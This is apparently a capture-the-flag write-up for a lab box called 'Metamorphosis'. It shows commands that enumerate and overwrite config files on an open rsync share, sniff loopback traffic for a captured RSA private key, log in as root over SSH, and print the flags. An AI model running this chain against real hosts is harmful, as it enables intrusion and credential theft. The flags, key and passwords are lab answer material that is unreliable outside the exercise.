# Metamorphosis 

> VOiD | Sunday 28 November 2021 04:51:43 PM UTC

My IP : 10.8.253.221
Target IP : 10.10.208.244


## PORT 80 [http]
view-source:http://10.10.208.244/admin/
<html> <head><h1>403 Forbidden</h1></head><!-- Make sure admin functionality can only be used in development environment. --></html>

## PORT 873 [rsync]
```bash
rsync -rdt rsync://10.10.208.244:873
Conf           	All Confs

rsync -rdt rsync://10.10.208.244:873/Conf
drwxrwxrwx          4,096 2021/04/10 20:03:08 .
-rw-r--r--          4,620 2021/04/09 20:01:22 access.conf
-rw-r--r--          1,341 2021/04/09 19:56:12 bluezone.ini
-rw-r--r--          2,969 2021/04/09 20:02:24 debconf.conf
-rw-r--r--            332 2021/04/09 20:01:38 ldap.conf
-rw-r--r--         94,404 2021/04/09 20:21:57 lvm.conf
-rw-r--r--          9,005 2021/04/09 19:58:40 mysql.ini
-rw-r--r--         70,207 2021/04/09 19:56:56 php.ini
-rw-r--r--            320 2021/04/09 20:03:16 ports.conf
-rw-r--r--            589 2021/04/09 20:01:07 resolv.conf
-rw-r--r--             29 2021/04/09 20:02:56 screen-cleanup.conf
-rw-r--r--          9,542 2021/04/09 20:00:59 smb.conf
-rw-rw-r--             72 2021/04/10 20:03:06 webapp.ini

rsync -av rsync://10.10.208.244:873/Conf ./rsync

cat webapp.ini 
[Web_App]
env = prod
user = tom
password = theCat

[Details]
Local = No

lets change env to dev and reupload it 

rsync -av rsync/webapp.ini rsync://10.10.208.244:873/Conf/webapp.ini   
sending incremental file list
webapp.ini

sent 179 bytes  received 41 bytes  88.00 bytes/sec
total size is 71  speedup is 0.32

```

## Shell [www-data]
```bash
$mysqli = new mysqli("localhost","dev","password","db");

linpeas says we can sniff traffic and we do it 
tcpdump -A -n -i lo | tee tcp.txt


Content-Length: 1678
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Sun, 28 Nov 2021 17:48:01 GMT

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyLHluXzbi43DIBFC47uRqkXTe72yPGxL+ImFwvOw8D/vd9mj
rt5SXjXSVtn6TguV2SFovrTlreUsv1CQwCSCixdMyQIWCgS/d+LfUyO3SC4FEr+k
wJ0ALG6wdjmHdRDW91JW0pG9Q+nTyv22K0a/yT91ZdlL/5cVjGKtYIob/504AdZZ
5NyCGq8t7ZUKhx0+TuKKcr2dDfL6rC5GBAnDkMxqo6tjkUH9nlFK7E9is0u1F3Zx
qrgn6PwOLDHeLgrQUok8NUwxDYxRM5zXT+I1Lr7/fGy/50ASvyDxZyjDuHbB7s14
K2HI32lVrx8u4X9Y2zgIU/mlIjuUtTyIAH4kswIDAQABAoIBAQCcPUImIPmZrwcU
09tLBx7je/CkCI3VVEngds9XcfdxUZTPrPMsk490IFpbmt6uG37Qxp2QuauEsUEg
v0uxCbtHJSB169XUftXAMzLAurFY09rHOcK84HzeGl3t6+N0U2PGrqdAzoyVblef
U9yZ3D46Idj3LS9pDumLnNZ0rZAWcaHW+rgjNqjsoBdQL7HGW+sacDAmZzU/Eti9
mH97NnrxkZuGXcnabXWcUj0HFHssCpF8KFPT3xxwtrqkUTJdMvUxxCD54HXiKM3u
jLXlX+HwHfLKHugYvLUuez7XFi6UP83Hiqmq48kB09sBa2iTV/iy6mHe7iyeELaa
9o7WHF2hAoGBAOPxNWc3vH18qu3WC6eMphPdYOaGBjbNBOgzJxzh/evxpSwRSG9V
63gNgKJ8zccQff/HH1n54VS+tuF7RCykRNb+Ne7K/uiDe1TpOKEMi7XtXOYHy5s1
tykL0OPdSs4hN1jMJjkSfPgdNPmxM3bbJMHDPjdQXAK6DnXmOCETaPAnAoGBAOFm
Fhqv8OREYFq+h1mDzMJn5WsNQQZnvvetJR7g3gfKcVblwMhlh504Tf3o00OGCKC1
L4iWMNb6uitKfTmGNta5X8ChWSVxXbb9fOWCOudNGt/fb70SK6fK9CSl66i/niIw
cIcu0tpS/T3MoqwMiGk87ivtW3bK20TsnY0tX3KVAoGAEeJdBEo1OctMRfjjVTQN
28Uk0zF0z1vqpKVOzk9U8uw0v25jtoiRPwwgKZ+NLa83k5f198NJULLd+ncHdFE3
LX8okCHROkEGrjTWQpyPYajL/yhhaz4drtTEgPxd4CpvA0KRRS0ULQttmqGyngK3
sZQ2D3T4oyYh+FIl2UKCm0UCgYEAyiHWqNAnY02+ayJ6FtiPg7fQkZQtQCVBqLNp
mqtl8e6mfZtEq3IBkAiySIXHD8Lfcd+KZR7rZZ8r3S7L5g5ql11edU08uMtVk4j3
vIpxcIRBGYsylYf6BluHXmY9U/OjSF3QTCq9hHTwDb+6EjibDGVL4bDWWU3KHaFk
GPsboZECgYAVK5KksKV2lJqjX7x1xPAuHoJEyYKiZJuw/uzAbwG2b4YxKTcTXhM6
ClH5GV7D5xijpfznQ/eZcTpr2f6mfZQ3roO+sah9v4H3LpzT8UydBU2FqILxck4v
QIaR6ed2y/NbuyJOIy7paSR+SlWT5G68FLaOmRzBqYdDOduhl061ww==
-----END RSA PRIVATE KEY-----

ssh root@10.10.208.244 -i id_rsa

```

## Flags
```
root@incognito:~# cat /home/tom/user.txt 
4ce794a9d0019c1f684e07556821e0b0             
root@incognito:~# cat /root/root.txt 
7ffca2ec63534d165525bf37d91b4ff4

```